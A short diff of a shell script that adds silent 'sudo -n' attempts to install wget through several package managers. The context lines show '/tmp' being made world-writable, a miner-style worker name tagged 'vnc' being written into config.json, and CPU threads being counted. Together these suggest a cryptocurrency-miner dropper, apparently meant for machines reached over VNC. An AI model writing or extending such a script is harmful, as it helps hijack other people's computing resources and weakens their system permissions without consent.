@@ -8,6 +8,12 @@ else
     sudo -n chmod 777 /tmp
 fi
 
+# try to install wget
+sudo -n apt update
+sudo -n apt install wget
+sudo -n apk add wget
+sudo -n dnf install wget
+
 if command -v wget >/dev/null 2>&1; then
     DOWNLOAD_CMD="wget"
 else
@@ -42,7 +48,6 @@ randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
 
 sudo -n apk add util-linux
-sudo -n apt update
 sudo -n apt install -y util-linux
 sudo -n dnf install util-linux
 num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
